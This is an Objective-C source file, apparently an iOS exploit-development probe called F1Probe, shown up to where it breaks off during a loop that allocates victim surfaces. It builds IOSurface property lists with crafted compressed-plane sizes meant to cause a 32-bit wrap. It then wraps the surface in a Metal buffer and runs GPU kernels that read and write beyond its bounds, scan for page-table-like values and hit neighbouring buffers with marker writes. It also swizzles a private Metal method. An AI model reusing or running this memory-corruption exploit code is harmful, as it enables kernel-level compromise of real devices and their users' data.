// F1Probe — IOSurface multi-slice compressed-plane 32-bit wrap candidate.
// Real calls only; every line is an actual API result.
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <IOSurface/IOSurfaceRef.h>
#import <Metal/Metal.h>
#import <CoreVideo/CoreVideo.h>
#import <objc/message.h>
#import <objc/runtime.h>
#import <sys/utsname.h>
#import <pthread.h>

static NSString *gDir;
static NSString *gLogPath;
static NSMutableString *gLog;
static pthread_mutex_t gLock = PTHREAD_MUTEX_INITIALIZER;

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    pthread_mutex_lock(&gLock);
    [gLog appendString:s]; [gLog appendString:@"\n"];
    [gLog writeToFile:gLogPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    pthread_mutex_unlock(&gLock);
    NSLog(@"[F1Probe] %@", s);
}

static uint32_t rd32(const void *p) { uint32_t v; memcpy(&v,p,4); return v; }
static uint64_t rd64(const void *p) { uint64_t v; memcpy(&v,p,8); return v; }

static NSString *hexdump(const void *buf, size_t len) {
    const uint8_t *p = buf; NSMutableString *s = [NSMutableString string];
    for (size_t i=0;i<len;i+=16) {
        [s appendFormat:@"%04zx: ", i];
        for (size_t j=0;j<16 && i+j<len;j++) [s appendFormat:@"%02x ", p[i+j]];
        [s appendString:@"\n"];
    }
    return s;
}

static NSString *normal_xml(void) {
    return @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
    "<plist version=\"1.0\"><dict>"
    "<key>IOSurfaceWidth</key><integer>64</integer>"
    "<key>IOSurfaceHeight</key><integer>64</integer>"
    "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
    "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
    "</dict></plist>\n";
}

static NSString *f1_xml_shape(uint32_t header, uint32_t slices, uint32_t data, uint32_t planeSize) {
    return [NSString stringWithFormat:
        @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
        "<plist version=\"1.0\"><dict>"
        "<key>IOSurfaceWidth</key><integer>64</integer>"
        "<key>IOSurfaceHeight</key><integer>64</integer>"
        "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
        "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
        "<key>IOSurfaceAllocSize</key><integer>%u</integer>"
        "<key>IOSurfaceSliceCount</key><integer>%u</integer>"
        "<key>IOSurfacePlaneInfo</key><array><dict>"
        "<key>IOSurfacePlaneWidth</key><integer>64</integer>"
        "<key>IOSurfacePlaneHeight</key><integer>64</integer>"
        "<key>IOSurfacePlaneBytesPerElement</key><integer>4</integer>"
        "<key>IOSurfacePlaneBytesPerRow</key><integer>512</integer>"
        "<key>IOSurfacePlaneSize</key><integer>%u</integer>"
        "<key>IOSurfacePlaneCompressionType</key><integer>4</integer>"
        "<key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>%u</integer>"
        "<key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>%u</integer>"
        "<key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer>"
        "<key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer>"
        "<key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer>"
        "<key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer>"
        "<key>IOSurfacePlaneWidthInCompressedTiles</key><integer>2</integer>"
        "<key>IOSurfacePlaneHeightInCompressedTiles</key><integer>2</integer>"
        "<key>IOSurfacePlaneBytesPerRowOfTileData</key><integer>8192</integer>"
        "<key>IOSurfacePlaneCompressedTileHeaderRegionOffset</key><integer>65536</integer>"
        "<key>IOSurfacePlaneCompressedTileDataRegionOffset</key><integer>0</integer>"
        "<key>IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups</key><integer>0</integer>"
        "</dict></array></dict></plist>\n",
        planeSize, slices, planeSize, data, header];
}

static NSString *f1_xml(void) {
    return f1_xml_shape(0x40000000, 4, 0x4000, 0x10000);
}

static void info_fields(const char *tag, const uint8_t *info, size_t n) {
    if (n < 0x78) { L(@"[F1] %s: short info %zu", tag, n); return; }
    uint32_t planes = rd32(info + 0x58);
    L(@"[F1] %s: id=%u planes=%u flag=%u pixfmt=0x%08x usecnt=%u sliceCount=0x%08x",
      tag, rd32(info+0x18), planes, info[0x5c], rd32(info+0x64), rd32(info+0x68), rd32(info+0x74));
    for (uint32_t i=0;i<planes && i<4;i++) {
        size_t off=0x88 + (size_t)i*0x98;
        if (off+0x88>n) break;
        L(@"[F1] %s: plane[%u] off=0x%zx tileData=0x%08x tileRow=0x%08x dataPerSlice=0x%08x headerPerSlice=0x%08x",
          tag, i, off, rd32(info+off+0x78), rd32(info+off+0x7c), rd32(info+off+0x80), rd32(info+off+0x84));
    }
}



static void dump_objc(id obj, const char *tag) {
    if (!obj) { L(@"[OBJC] %s nil", tag); return; }
    Class cls = object_getClass(obj);
    L(@"[OBJC] %s class=%s", tag, class_getName(cls));
    for (Class c = cls; c && c != [NSObject class]; c = class_getSuperclass(c)) {
        unsigned int count = 0;
        Method *methods = class_copyMethodList(c, &count);
        for (unsigned int i = 0; i < count; i++) {
            const char *name = sel_getName(method_getName(methods[i]));
            if (strstr(name, "gpu") || strstr(name, "GPU") ||
                strstr(name, "address") || strstr(name, "Address") ||
                strstr(name, "resource") || strstr(name, "Resource") ||
                strstr(name, "buffer") || strstr(name, "Buffer") ||
                strstr(name, "virtual") || strstr(name, "Virtual")) {
                L(@"[OBJC]   -[%s %s] type=%s", class_getName(c), name,
                  method_getTypeEncoding(methods[i]));
            }
        }
        free(methods);
        Ivar *ivars = class_copyIvarList(c, &count);
        for (unsigned int i = 0; i < count; i++) {
            const char *name = ivar_getName(ivars[i]);
            const char *type = ivar_getTypeEncoding(ivars[i]);
            if (strstr(name, "gpu") || strstr(name, "GPU") ||
                strstr(name, "address") || strstr(name, "Address") ||
                strstr(name, "resource") || strstr(name, "Resource") ||
                strstr(name, "buffer") || strstr(name, "Buffer") ||
                strstr(name, "virtual") || strstr(name, "Virtual")) {
                L(@"[OBJC]   ivar %s %s %s", class_getName(c), name, type);
            }
        }
        free(ivars);
    }
}


static void dump_qwords(const char *tag, const void *ptr, size_t len) {
    if (!ptr) { L(@"[%s] nil", tag); return; }
    const uint64_t *q = (const uint64_t *)ptr;
    for (size_t i = 0; i < len/8; i += 8) {
        NSMutableString *line = [NSMutableString string];
        for (size_t j = 0; j < 8 && i+j < len/8; j++) {
            [line appendFormat:@"%016llx ", (unsigned long long)q[i+j]];
        }
        L(@"[%s] +0x%03zx %@", tag, i*8, line);
    }
}


static id gHookTarget = nil;
static IMP gOrigFill = NULL;
static void hookFill(id self, SEL _cmd, void *args, id queue) {
    ((void (*)(id, SEL, void *, id))gOrigFill)(self, _cmd, args, queue);
    if (self == gHookTarget) {
        dump_qwords("FILLARGS", args, 0x100);
        gHookTarget = nil;
    }
}

static void metal_oob(IOSurfaceRef surf, IOSurfaceRef *victims, int vc) {
    L(@"[METAL] start");
    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    L(@"[METAL] device=%p name=%@", dev, dev ? [dev name] : @"nil");
    if (!dev) return;

    void *base = IOSurfaceGetBaseAddress(surf);
    size_t alloc = IOSurfaceGetAllocSize(surf);
    L(@"[METAL] surface base=%p alloc=0x%zx", base, alloc);
    if (!base || alloc < 0x4000) return;

    NSError *err = nil;
    id<MTLBuffer> sbuf = [dev newBufferWithBytesNoCopy:base length:0x10000
                                              options:MTLResourceStorageModeShared
                                           deallocator:nil];
    L(@"[METAL] MTLBuffer wrap=%p len=%lu err=%@",
      sbuf, sbuf ? (unsigned long)sbuf.length : 0UL, err);
    uint64_t f1ga = 0;
    SEL gas = NSSelectorFromString(@"gpuAddress");
    if ([sbuf respondsToSelector:gas]) {
        uint64_t ga = ((uint64_t(*)(id, SEL))objc_msgSend)(sbuf, gas);
        f1ga = ga;
        L(@"[METAL] gpuAddress=0x%llx", ga);
    } else {
        L(@"[METAL] gpuAddress selector absent");
    }

    NSString *src = @"#include <metal_stdlib>\n"
    "using namespace metal;\n"
    "kernel void rd(device uint *buf [[buffer(0)]], device uint *out [[buffer(1)]], constant uint &idx [[buffer(2)]]) {\n"
    "  out[0] = buf[idx];\n"
    "}\n"
    "kernel void wr(device uint *buf [[buffer(0)]], constant uint &idx [[buffer(1)]], constant uint &val [[buffer(2)]]) {\n"
    "  buf[idx] = val;\n"
    "}\n"
    "kernel void peek(device ulong *buf [[buffer(0)]], device ulong *out [[buffer(1)]], constant uint &idx [[buffer(2)]]) {\n"
    "  for (uint i = 0; i < 8; i++) out[i] = buf[idx + i];\n"
    "}\n"
    "kernel void dump(device ulong *buf [[buffer(0)]], device ulong *out [[buffer(1)]], constant uint &idx [[buffer(2)]], constant uint &count [[buffer(3)]]) {\n"
    "  for (uint i = 0; i < count; i++) out[i] = buf[idx + i];\n"
    "}\n"
    "kernel void scan(device ulong *buf [[buffer(0)]], device uint *out [[buffer(1)]], uint page [[thread_position_in_grid]]) {\n"
    "  uint nz = 0, pte = 0;\n"
    "  for (uint i = 0; i < 512; i++) {\n"
    "    ulong v = buf[page * 512 + i];\n"
    "    if (v) nz++;\n"
    "    if ((v & 7) && ((v >> 48) == 0)) pte++;\n"
    "  }\n"
    "  out[page*4+0] = nz; out[page*4+1] = pte;\n"
    "  out[page*4+2] = (uint)buf[page*512]; out[page*4+3] = (uint)(buf[page*512] >> 32);\n"
    "}\n";
    id<MTLLibrary> lib = [dev newLibraryWithSource:src options:nil error:&err];
    L(@"[METAL] library=%p err=%@", lib, err);
    if (!lib) return;
    id<MTLFunction> frd = [lib newFunctionWithName:@"rd"];
    id<MTLFunction> fwr = [lib newFunctionWithName:@"wr"];
    id<MTLFunction> fpeek = [lib newFunctionWithName:@"peek"];
    id<MTLFunction> fdump = [lib newFunctionWithName:@"dump"];
    id<MTLFunction> fscan = [lib newFunctionWithName:@"scan"];
    id<MTLComputePipelineState> prd = frd ? [dev newComputePipelineStateWithFunction:frd error:&err] : nil;
    id<MTLComputePipelineState> pwr = fwr ? [dev newComputePipelineStateWithFunction:fwr error:&err] : nil;
    id<MTLComputePipelineState> ppeek = fpeek ? [dev newComputePipelineStateWithFunction:fpeek error:&err] : nil;
    id<MTLComputePipelineState> pdump = fdump ? [dev newComputePipelineStateWithFunction:fdump error:&err] : nil;
    id<MTLComputePipelineState> pscan = fscan ? [dev newComputePipelineStateWithFunction:fscan error:&err] : nil;
    L(@"[METAL] rd=%p wr=%p peek=%p dump=%p scan=%p err=%@", prd, pwr, ppeek, pdump, pscan, err);
    if (!prd || !pwr || !ppeek || !pdump || !pscan || !sbuf) return;

    id<MTLCommandQueue> q = [dev newCommandQueue];
    id<MTLCommandBuffer> probe = [q commandBuffer];
    dump_objc(probe, "cmdbuf");
    dump_objc(q, "cmdqueue");
    SEL sstorage = NSSelectorFromString(@"commandBufferStorage");
    if ([probe respondsToSelector:sstorage]) {
        void *st = ((void *(*)(id, SEL))objc_msgSend)(probe, sstorage);
        L(@"[CBSTORAGE] ptr=%p", st);
        dump_qwords("CBSTORAGE", st, 0x200);
    } else {
        L(@"[CBSTORAGE] selector absent");
    }
    SEL sargs = NSSelectorFromString(@"fillCommandBufferArgs:commandQueue:");
    if ([probe respondsToSelector:sargs]) {
        uint8_t args[0x100];
        memset(args, 0, sizeof(args));
        ((void (*)(id, SEL, void *, id))objc_msgSend)(probe, sargs, args, q);
        dump_qwords("CBARGS", args, 0x100);
    } else {
        L(@"[CBARGS] selector absent");
    }
    Method fillm = class_getInstanceMethod(object_getClass(probe), NSSelectorFromString(@"fillCommandBufferArgs:commandQueue:"));
    if (fillm) {
        gOrigFill = method_getImplementation(fillm);
        method_setImplementation(fillm, (IMP)hookFill);
        gHookTarget = probe;
        L(@"[HOOK] fillCommandBufferArgs installed");
    } else {
        L(@"[HOOK] fillCommandBufferArgs not found");
    }
    [probe commit];
    [probe waitUntilCompleted];
    id<MTLBuffer> peekout = [dev newBufferWithLength:64 options:MTLResourceStorageModeShared];
    uint32_t peekoffs[] = {0x000000,0x001000,0x010000,0x020000,0x030000,0x040000,
                           0x080000,0x0c0000,0x0e8000,0x100000,0x200000,0x400000,
                           0x800000,0xfff000};
    for (int pi = 0; pi < (int)(sizeof(peekoffs)/sizeof(peekoffs[0])); pi++) {
        uint32_t off = peekoffs[pi];
        uint32_t qidx = off / 8;
        id<MTLCommandBuffer> pb = [q commandBuffer];
        id<MTLComputeCommandEncoder> pe = [pb computeCommandEncoder];
        [pe setComputePipelineState:ppeek];
        [pe setBuffer:sbuf offset:0 atIndex:0];
        [pe setBuffer:peekout offset:0 atIndex:1];
        [pe setBytes:&qidx length:4 atIndex:2];
        [pe dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
        [pe endEncoding];
        [pb commit];
        [pb waitUntilCompleted];
        if (pb.status == MTLCommandBufferStatusError) {
            L(@"[PEEK] off=0x%x ERROR status=%lu err=%@", off, (unsigned long)pb.status, pb.error);
            break;
        }
        uint64_t vals[8] = {0};
        if (peekout.contents) memcpy(vals, peekout.contents, sizeof(vals));
        L(@"[PEEK] off=0x%x %016llx %016llx %016llx %016llx %016llx %016llx %016llx %016llx",
          off, (unsigned long long)vals[0], (unsigned long long)vals[1],
          (unsigned long long)vals[2], (unsigned long long)vals[3],
          (unsigned long long)vals[4], (unsigned long long)vals[5],
          (unsigned long long)vals[6], (unsigned long long)vals[7]);
    }

    id<MTLBuffer> dumpout = [dev newBufferWithLength:4096 options:MTLResourceStorageModeShared];
    uint32_t dumpoffs[] = {0x33000};
    for (int di = 0; di < (int)(sizeof(dumpoffs)/sizeof(dumpoffs[0])); di++) {
        uint32_t off = dumpoffs[di];
        uint32_t qidx = off / 8;
        uint32_t count = 512;
        id<MTLCommandBuffer> db = [q commandBuffer];
        id<MTLComputeCommandEncoder> de = [db computeCommandEncoder];
        [de setComputePipelineState:pdump];
        [de setBuffer:sbuf offset:0 atIndex:0];
        [de setBuffer:dumpout offset:0 atIndex:1];
        [de setBytes:&qidx length:4 atIndex:2];
        [de setBytes:&count length:4 atIndex:3];
        [de dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
        [de endEncoding];
        [db commit];
        [db waitUntilCompleted];
        if (db.status == MTLCommandBufferStatusError) {
            L(@"[DUMP] off=0x%x ERROR status=%lu err=%@", off, (unsigned long)db.status, db.error);
            break;
        }
        L(@"[DUMP] off=0x%x\n%@", off, hexdump(dumpout.contents, 4096));
    }

    id<MTLBuffer> scanout = [dev newBufferWithLength:4096*16 options:MTLResourceStorageModeShared];
    {
        id<MTLCommandBuffer> sb = [q commandBuffer];
        id<MTLComputeCommandEncoder> se = [sb computeCommandEncoder];
        [se setComputePipelineState:pscan];
        [se setBuffer:sbuf offset:0 atIndex:0];
        [se setBuffer:scanout offset:0 atIndex:1];
        [se dispatchThreadgroups:MTLSizeMake(4096,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
        [se endEncoding];
        [sb commit];
        [sb waitUntilCompleted];
        if (sb.status == MTLCommandBufferStatusError) {
            L(@"[SCAN] ERROR status=%lu err=%@", (unsigned long)sb.status, sb.error);
        } else {
            uint32_t *sp = (uint32_t *)scanout.contents;
            int printed = 0, nzpages = 0, ptepgs = 0;
            for (int pg = 0; pg < 4096; pg++) {
                uint32_t nz = sp[pg*4+0], pte = sp[pg*4+1];
                if (nz) nzpages++;
                if (pte) ptepgs++;
                if (pte >= 32 && printed < 96) {
                    L(@"[SCAN] page=0x%x off=0x%x nz=%u pte=%u first=%08x%08x",
                      pg, pg*0x1000, nz, pte, sp[pg*4+3], sp[pg*4+2]);
                    printed++;
                }
            }
            L(@"[SCAN] done nzpages=%d ptepgs=%d printed=%d", nzpages, ptepgs, printed);
        }
    }

    id<MTLBuffer> out = [dev newBufferWithLength:16 options:MTLResourceStorageModeShared];
    uint32_t idxs[3] = {0, 0x20000/4, 0x400000/4};

    for (int i=0;i<3;i++) {
        uint32_t idx = idxs[i];
        id<MTLCommandBuffer> cb = [q commandBuffer];
        id<MTLComputeCommandEncoder> enc = [cb computeCommandEncoder];
        [enc setComputePipelineState:prd];
        [enc setBuffer:sbuf offset:0 atIndex:0];
        [enc setBuffer:out offset:0 atIndex:1];
        [enc setBytes:&idx length:4 atIndex:2];
        [enc dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
        [enc endEncoding];
        [cb commit];
        [cb waitUntilCompleted];
        uint32_t v = 0;
        if (out.contents) memcpy(&v, out.contents, 4);
        L(@"[METAL] READ idx=0x%x status=%lu err=%@ val=0x%08x",
          idx, (unsigned long)cb.status, cb.error, v);
        if (cb.status == MTLCommandBufferStatusError) break;
        if (i >= 1) {
            uint32_t marker = 0x41414141;
            id<MTLCommandBuffer> wb = [q commandBuffer];
            id<MTLComputeCommandEncoder> we = [wb computeCommandEncoder];
            [we setComputePipelineState:pwr];
            [we setBuffer:sbuf offset:0 atIndex:0];
            [we setBytes:&idx length:4 atIndex:1];
            [we setBytes:&marker length:4 atIndex:2];
            [we dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
            [we endEncoding];
            [wb commit];
            [wb waitUntilCompleted];
            L(@"[METAL] WRITE idx=0x%x marker=0x%08x status=%lu err=%@",
              idx, marker, (unsigned long)wb.status, wb.error);
            if (wb.status == MTLCommandBufferStatusError) break;

            id<MTLCommandBuffer> rb = [q commandBuffer];
            id<MTLComputeCommandEncoder> re = [rb computeCommandEncoder];
            [re setComputePipelineState:prd];
            [re setBuffer:sbuf offset:0 atIndex:0];
            [re setBuffer:out offset:0 atIndex:1];
            [re setBytes:&idx length:4 atIndex:2];
            [re dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
            [re endEncoding];
            [rb commit];
            [rb waitUntilCompleted];
            uint32_t back = 0;
            if (out.contents) memcpy(&back, out.contents, 4);
            L(@"[METAL] READBACK idx=0x%x marker=0x%08x back=0x%08x status=%lu err=%@",
              idx, marker, back, (unsigned long)rb.status, rb.error);
            if (i == 1) {
                for (int vi = 0; vi < vc; vi++) {
                    void *vb = IOSurfaceGetBaseAddress(victims[vi]);
                    if (!vb) continue;
                    for (size_t o = 0; o + 4 <= 0x10000; o += 4) {
                        if (*(uint32_t *)((uint8_t *)vb + o) == marker) {
                            L(@"[METAL] VICTIM HIT victim=%d off=0x%zx marker=0x%08x", vi, o, marker);
                        }
                    }
                }
            }

            uint32_t orig = v;
            id<MTLCommandBuffer> ob = [q commandBuffer];
            id<MTLComputeCommandEncoder> oe = [ob computeCommandEncoder];
            [oe setComputePipelineState:pwr];
            [oe setBuffer:sbuf offset:0 atIndex:0];
            [oe setBytes:&idx length:4 atIndex:1];
            [oe setBytes:&orig length:4 atIndex:2];
            [oe dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
            [oe endEncoding];
            [ob commit];
            [ob waitUntilCompleted];
            L(@"[METAL] RESTORE idx=0x%x orig=0x%08x status=%lu err=%@",
              idx, orig, (unsigned long)ob.status, ob.error);
            if (rb.status == MTLCommandBufferStatusError || ob.status == MTLCommandBufferStatusError) break;
        }
    }

    // Control: a normal MTLBuffer with no IOSurface/F1 backing.
    uint64_t ctrlga = 0;
    id<MTLBuffer> ctrl = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
    L(@"[CTRLBUF] buffer=%p len=%lu", ctrl, ctrl ? (unsigned long)ctrl.length : 0UL);
    if (ctrl && ctrl.contents) {
        for (size_t o = 0; o + 4 <= 0x10000; o += 4)
            *(uint32_t *)((uint8_t *)ctrl.contents + o) = 0x42424242;
    }
    SEL cgs = NSSelectorFromString(@"gpuAddress");
    if (ctrl && [ctrl respondsToSelector:cgs]) {
        uint64_t ga = ((uint64_t(*)(id, SEL))objc_msgSend)(ctrl, cgs);
        ctrlga = ga;
        L(@"[CTRLBUF] gpuAddress=0x%llx", ga);
    }
    if (ctrl) {
        uint32_t idx = 0x8000;
        id<MTLCommandBuffer> cb = [q commandBuffer];
        id<MTLComputeCommandEncoder> enc = [cb computeCommandEncoder];
        [enc setComputePipelineState:prd];
        [enc setBuffer:ctrl offset:0 atIndex:0];
        [enc setBuffer:out offset:0 atIndex:1];
        [enc setBytes:&idx length:4 atIndex:2];
        [enc dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
        [enc endEncoding];
        [cb commit];
        [cb waitUntilCompleted];
        uint32_t v = 0;
        if (out.contents) memcpy(&v, out.contents, 4);
        L(@"[CTRLBUF] READ idx=0x%x status=%lu err=%@ val=0x%08x",
          idx, (unsigned long)cb.status, cb.error, v);
        if (cb.status == MTLCommandBufferStatusCompleted) {
            uint32_t marker = 0x42424242;
            id<MTLCommandBuffer> wb = [q commandBuffer];
            id<MTLComputeCommandEncoder> we = [wb computeCommandEncoder];
            [we setComputePipelineState:pwr];
            [we setBuffer:ctrl offset:0 atIndex:0];
            [we setBytes:&idx length:4 atIndex:1];
            [we setBytes:&marker length:4 atIndex:2];
            [we dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
            [we endEncoding];
            [wb commit];
            [wb waitUntilCompleted];
            L(@"[CTRLBUF] WRITE idx=0x%x marker=0x%08x status=%lu err=%@",
              idx, marker, (unsigned long)wb.status, wb.error);
            id<MTLCommandBuffer> rb = [q commandBuffer];
            id<MTLComputeCommandEncoder> re = [rb computeCommandEncoder];
            [re setComputePipelineState:prd];
            [re setBuffer:ctrl offset:0 atIndex:0];
            [re setBuffer:out offset:0 atIndex:1];
            [re setBytes:&idx length:4 atIndex:2];
            [re dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
            [re endEncoding];
            [rb commit];
            [rb waitUntilCompleted];
            uint32_t back = 0;
            if (out.contents) memcpy(&back, out.contents, 4);
            L(@"[CTRLBUF] READBACK idx=0x%x back=0x%08x status=%lu err=%@",
              idx, back, (unsigned long)rb.status, rb.error);
            uint32_t orig = v;
            id<MTLCommandBuffer> ob = [q commandBuffer];
            id<MTLComputeCommandEncoder> oe = [ob computeCommandEncoder];
            [oe setComputePipelineState:pwr];
            [oe setBuffer:ctrl offset:0 atIndex:0];
            [oe setBytes:&idx length:4 atIndex:1];
            [oe setBytes:&orig length:4 atIndex:2];
            [oe dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
            [oe endEncoding];
            [ob commit];
            [ob waitUntilCompleted];
            L(@"[CTRLBUF] RESTORE idx=0x%x orig=0x%08x status=%lu err=%@",
              idx, orig, (unsigned long)ob.status, ob.error);
        }
    }
    if (f1ga && ctrlga && ctrlga > f1ga && (ctrlga - f1ga) < 0x1000000) {
        uint64_t delta = ctrlga - f1ga;
        uint32_t xidx = (uint32_t)(delta / 4);
        L(@"[XOBJ] f1ga=0x%llx ctrlga=0x%llx delta=0x%llx xidx=0x%x",
          f1ga, ctrlga, delta, xidx);
        uint32_t xmark = 0x43434343;
        id<MTLCommandBuffer> xb = [q commandBuffer];
        id<MTLComputeCommandEncoder> xe = [xb computeCommandEncoder];
        [xe setComputePipelineState:pwr];
        [xe setBuffer:sbuf offset:0 atIndex:0];
        [xe setBytes:&xidx length:4 atIndex:1];
        [xe setBytes:&xmark length:4 atIndex:2];
        [xe dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
        [xe endEncoding];
        [xb commit];
        [xb waitUntilCompleted];
        L(@"[XOBJ] F1 write ctrl-va marker=0x%08x status=%lu err=%@",
          xmark, (unsigned long)xb.status, xb.error);
        int hits = 0;
        if (ctrl.contents) {
            for (size_t o = 0; o + 4 <= 0x10000; o += 4) {
                if (*(uint32_t *)((uint8_t *)ctrl.contents + o) == xmark) {
                    L(@"[XOBJ] *** CROSS-OBJECT HIT ctrl off=0x%zx ***", o);
                    hits++;
                }
            }
        }
        L(@"[XOBJ] hits=%d", hits);
        uint32_t zero = 0;
        id<MTLCommandBuffer> zb = [q commandBuffer];
        id<MTLComputeCommandEncoder> ze = [zb computeCommandEncoder];
        [ze setComputePipelineState:pwr];
        [ze setBuffer:sbuf offset:0 atIndex:0];
        [ze setBytes:&xidx length:4 atIndex:1];
        [ze setBytes:&zero length:4 atIndex:2];
        [ze dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
        [ze endEncoding];
        [zb commit];
        [zb waitUntilCompleted];
        L(@"[XOBJ] restore status=%lu err=%@", (unsigned long)zb.status, zb.error);
    }
    L(@"[METAL] done");
}



static const struct { uint32_t header, slices, data, plane; } gShapes[] = {
    {0x40000000, 4, 0x4000, 0x10000},
    {0x3FFFF000, 4, 0x4000, 0x10000},
    {0x3FFFFC00, 4, 0x4000, 0x10000},
    {0x3FFFFE00, 4, 0x4000, 0x10000},
    {0x3FFFFF00, 4, 0x4000, 0x10000},
    {0x3FFFFF80, 4, 0x4000, 0x10000},
};

static int gQuiet = 0;

static int arg_int(NSString *prefix) {
    NSArray *args = NSProcessInfo.processInfo.arguments;
    for (NSString *a in args) {
        if ([a hasPrefix:prefix])
            return atoi([[a substringFromIndex:prefix.length] UTF8String]);
    }
    return 0;
}

static int arg_shape(void) {
    NSArray *args = NSProcessInfo.processInfo.arguments;
    for (NSUInteger i = 0; i < args.count; i++) {
        NSString *a = args[i];
        if ([a isEqualToString:@"--shape"] && i + 1 < args.count)
            return atoi([args[i+1] UTF8String]);
        if ([a hasPrefix:@"--shape="])
            return atoi([[a substringFromIndex:8] UTF8String]);
    }
    return -1;
}

static uint32_t str_sum(const char *p, size_t n) {
    uint32_t h = 0;
    for (size_t i = 0; i < n; i++) h = h * 31u + (uint8_t)p[i];
    return h;
}

static void single_shape_probe(int idx) {
    if (idx < 0 || idx >= (int)(sizeof(gShapes)/sizeof(gShapes[0]))) {
        L(@"[SHAPE] bad idx=%d", idx);
        return;
    }
    L(@"[SHAPE] start idx=%d header=0x%x slices=%u data=0x%x plane=0x%x",
      idx, gShapes[idx].header, gShapes[idx].slices, gShapes[idx].data, gShapes[idx].plane);

    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (!svc) { L(@"[SHAPE] no IOSurfaceRoot"); return; }
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    IOObjectRelease(svc);
    L(@"[SHAPE] IOSurfaceRoot open -> 0x%x conn=0x%x", kr, conn);
    if (kr != KERN_SUCCESS) return;

    uint64_t sc[1] = {0};
    uint8_t *info = calloc(1, 0xc68);
    size_t isz = 0xc68;

    // Control surface first, like the main probe.
    NSString *ctrl = normal_xml();
    const char *cc = ctrl.UTF8String;
    size_t clen = cc ? strlen(cc) + 1 : 0;
    if (cc && clen <= 0x1000) {
        size_t csz = 0xc68;
        kern_return_t ckr = IOConnectCallMethod(conn, 0, sc, 1, cc, clen, NULL, NULL, info, &csz);
        L(@"[SHAPE] control sel0 -> 0x%x id=%u", ckr, csz >= 0x1c ? rd32(info + 0x18) : 0);
    }
    memset(info, 0, 0xc68);
    isz = 0xc68;
    NSString *xml = f1_xml_shape(gShapes[idx].header, gShapes[idx].slices, gShapes[idx].data, gShapes[idx].plane);
    const char *xc = xml.UTF8String;
    size_t xlen = xc ? strlen(xc) + 1 : 0;
    L(@"[SHAPE] xml len=%zu sum=0x%x", xlen, xc ? str_sum(xc, xlen) : 0);
    kr = IOConnectCallMethod(conn, 0, sc, 1, xc, xlen, NULL, NULL, info, &isz);
    if (kr != KERN_SUCCESS) {
        L(@"[SHAPE] f1 sel0 -> 0x%x osz=0x%zx", kr, isz);
        free(info); IOServiceClose(conn); return;
    }
    if (!gQuiet) {
        info_fields("shape", info, isz);
        L(@"[SHAPE] info:\n%@", hexdump(info, 0x120));
    }
    uint32_t sid = isz >= 0x1c ? rd32(info + 0x18) : 0;
    IOSurfaceRef s = sid ? IOSurfaceLookup(sid) : NULL;
    L(@"[SHAPE] f1 id=%u api_id=%u alloc=0x%zx base=%p", sid, s ? IOSurfaceGetID(s) : 0,
      s ? IOSurfaceGetAllocSize(s) : 0, s ? IOSurfaceGetBaseAddress(s) : NULL);
    if (s) {
        size_t planes = IOSurfaceGetPlaneCount(s);
        for (size_t i = 0; i < planes && i < 4; i++) {
            void *pb = IOSurfaceGetBaseAddressOfPlane(s, i);
            L(@"[SHAPE] plane[%zu] base=%p bpr=%zu h=%zu", i, pb,
              IOSurfaceGetBytesPerRowOfPlane(s, i), IOSurfaceGetHeightOfPlane(s, i));
        }
    }

    IOSurfaceRef victims[64];
    int vc = 0;
    for (int vi = 0; vi < 32; vi++) {
        NSDictionary *vp = @{
            @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
            @"IOSurfaceBytesPerElement": @4,
            @"IOSurfacePixelFormat": @0x42475241,
            @"IOSurfaceAllocSize": @0x10000
        };
        IOSurfaceRef v = IOSurfaceCreate((__bridge CFDictionaryRef)vp);
        if (!v) break;
